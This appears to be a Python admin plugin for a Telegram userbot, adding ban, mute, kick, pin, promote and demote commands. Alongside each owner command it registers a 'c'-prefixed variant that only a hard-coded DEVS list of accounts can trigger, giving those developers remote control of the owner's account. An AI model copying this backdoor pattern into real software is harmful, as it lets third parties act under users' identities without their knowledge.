from RockyX import *
from RockyX.lib import *

from pykillerx.blacklist import *
from pykillerx.help import *

@M3_4_U(filters.group & command(["setchatphoto", "setgpic"], cmd) & owner)
async def setphp_command(client: Client, message: Message):
    await set_chat_photo(client, message)

@M3_4_U(filters.group & command(["cban", "cdban"], cmd) & filters.user(DEVS) & ~owner)
@ren.on_message(filters.group & command(["ban", "dban"], cmd) & filters.me)
async def ban_command(client: Client, message: Message):
    await member_ban_user(client, message)

@M3_4_U(filters.group & command("cunban", cmd) & filters.user(DEVS) & ~owner)
@M3_4_U(filters.group & command("unban", cmd) & owner)
async def unban_command(client: Client, message: Message):
    await member_unban_user(client, message)

@M3_4_U(command(["cpin", "cunpin"], cmd) & filters.user(DEVS) & ~owner)
@M3_4_U(command(["pin", "unpin"], cmd) & owner)
async def pin_cmd(client: Client, message: Message):
    await pin_message(client, message)

@M3_4_U(command(["cmute", "cdmute"], cmd) & filters.user(DEVS) & ~owner)
@M3_4_U(command(["mute", "dmute"], cmd) & owner)
async def mute_cmd(client: Client, message: Message):
    await mute_user(client, message)

@M3_4_U(filters.group & command("cunmute", cmd) & filters.user(DEVS) & ~owner)
@M3_4_U(filters.group & command("unmute", cmd) & owner)
async def unmute_cmd(client: Client, message: Message):
    await unmute_user(client, message)

@M3_4_U(command(["ckick", "dkick"], cmd) & filters.user(DEVS) & ~owner)
@M3_4_U(command(["kick", "dkick"], cmd) & owner)
async def kick_cmd(client: Client, message: Message):
    await kick_user(client, message)

@M3_4_U(filters.group & command(["cpromote", "cfullpromote"], cmd) & filters.user(DEVS) & ~owner)
@M3_4_U(filters.group & command(["promote", "fullpromote"], cmd) & owner)
async def promotte_cmd(client: Client, message: Message):
    await promotte_user(client, message)

@M3_4_U(filters.group & command("cdemote", cmd) & filters.user(DEVS) & ~owner)
@M3_4_U(filters.group & command("demote", cmd) & filters.me)
async def demote_cmd(client: Client, message: Message):
    await demote_user(client, message)

add_command_help(
    "admin",
    [
        [f"ban [reply/username/userid]", "Ban someone."],
        [f"dban [reply]", "dban a user deleting the replied to message."],
        [f"unban [reply/username/userid]", "Unban someone."],
        [f"kick [reply/username/userid]", "kick out someone from your group."],
        [f"dkick [reply]", "dkick a user deleting the replied to message."],
        [f"promote `or` .fullpromote", "Promote someonen."],
        ["demote", "Demote someone."],
        [f"mute [reply/username/userid]", "Mute someone."],
        [f"dmute [reply]", "dmute a user deleting the replied to message."],
        [f"unmute [reply/username/userid]", "Unmute someone."],
        [f"pin [reply]", "to pin any message."],
        [f"unpin [reply]", "To unpin any message."],
        [f"setgpic [reply ke image]", "To set an group profile pic."],
    ],
)
